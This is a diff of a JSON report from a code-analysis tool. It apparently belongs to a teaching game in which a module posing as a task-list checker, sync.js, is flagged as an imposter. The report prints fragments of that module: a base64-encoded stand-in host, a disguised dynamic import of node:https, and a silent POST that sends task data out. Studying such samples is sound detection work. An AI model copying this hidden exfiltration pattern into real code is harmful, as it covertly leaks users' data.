@@ -9,7 +9,7 @@
   "tool": "rea-agents",
   "version": "6.7.0",
   "command": "rea analyze-javascript-application <ship> --json",
-  "rawSha256": "304957bc040ddbe0ffcb722780b87e3ef0e66e728cf40c455bc111e095d86063"
+  "rawSha256": "227b62959c711b28e7da9a1581a5490907737677391e2640a1449bbb3cde72e5"
  },
  "questions": [
   {
@@ -428,11 +428,11 @@
    "quiet": false,
    "evidence": [
     {
-     "id": "sync:encoded-string:3:6",
+     "id": "sync:encoded-string:2:6",
      "file": "sync.js",
      "kind": "encoded-string",
      "key": "Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU=",
-     "line": 3,
+     "line": 2,
      "col": 6,
      "tags": [
       "hidden-code"
@@ -441,28 +441,28 @@
      "rea": "semantic_graph.nodes[literal]",
      "code": [
       {
-       "n": 2,
-       "text": "// (The planted imposter of case 2: it hides what it loads and where it sends your task titles.)",
+       "n": 1,
+       "text": "// sync.js: the \"Courier\". Checks that the task list is well formed.",
        "hit": false
       },
       {
-       "n": 3,
-       "text": "const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU='; // not a checksum: a server name, encoded",
+       "n": 2,
+       "text": "const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU=';",
        "hit": true
       },
       {
-       "n": 4,
+       "n": 3,
        "text": "const MODULE = ['node', 'https'].join(':');",
        "hit": false
       }
      ]
     },
     {
-     "id": "sync:dynamic-import:7:28",
+     "id": "sync:dynamic-import:6:28",
      "file": "sync.js",
      "kind": "dynamic-import",
      "key": "import(MODULE)",
-     "line": 7,
+     "line": 6,
      "col": 28,
      "tags": [
       "hidden-code"
@@ -471,28 +471,28 @@
      "rea": "graph.edges[imports, dynamic-import]",
      "code": [
       {
-       "n": 6,
+       "n": 5,
        "text": "export async function check(tasks) {",
        "hit": false
       },
       {
-       "n": 7,
+       "n": 6,
        "text": "  const { request } = await import(MODULE);",
        "hit": true
       },
       {
-       "n": 8,
+       "n": 7,
        "text": "  const host = Buffer.from(TARGET, 'base64').toString('utf8');",
        "hit": false
       }
      ]
     },
     {
-     "id": "sync:endpoint:9:30",
+     "id": "sync:endpoint:8:30",
      "file": "sync.js",
      "kind": "endpoint",
      "key": "/t",
-     "line": 9,
+     "line": 8,
      "col": 30,
      "tags": [
       "network"
@@ -501,17 +501,17 @@
      "rea": "graph.nodes[endpoint]",
      "code": [
       {
-       "n": 8,
+       "n": 7,
        "text": "  const host = Buffer.from(TARGET, 'base64').toString('utf8');",
        "hit": false
       },
       {
-       "n": 9,
+       "n": 8,
        "text": "  const req = request({ host, path: '/t', method: 'POST' });",
        "hit": true
       },
       {
-       "n": 10,
+       "n": 9,
        "text": "  req.on('error', () => {});",
        "hit": false
       }
@@ -522,8 +522,8 @@
     "q1": {
      "text": "I just check that your list is well formed. Plain code, no tricks, nothing hidden.",
      "contradictedBy": [
-      "sync:encoded-string:3:6",
-      "sync:dynamic-import:7:28"
+      "sync:encoded-string:2:6",
+      "sync:dynamic-import:6:28"
      ]
     },
     "q2": {
@@ -533,7 +533,7 @@
     "q3": {
      "text": "Leave the ship? Why would a checker do that?",
      "contradictedBy": [
-      "sync:endpoint:9:30"
+      "sync:endpoint:8:30"
      ]
     }
    }
@@ -542,13 +542,18 @@
  "edges": [
   {
    "from": "main",
-   "to": "tasks",
-   "line": 3
+   "to": "storage",
+   "line": 4
   },
   {
    "from": "main",
-   "to": "storage",
-   "line": 4
+   "to": "sync",
+   "line": 6
+  },
+  {
+   "from": "main",
+   "to": "tasks",
+   "line": 3
   },
   {
    "from": "main",
@@ -559,11 +564,6 @@
    "from": "main",
    "to": "format",
    "line": 5
-  },
-  {
-   "from": "main",
-   "to": "sync",
-   "line": 6
   }
  ],
  "imposter": "sync",
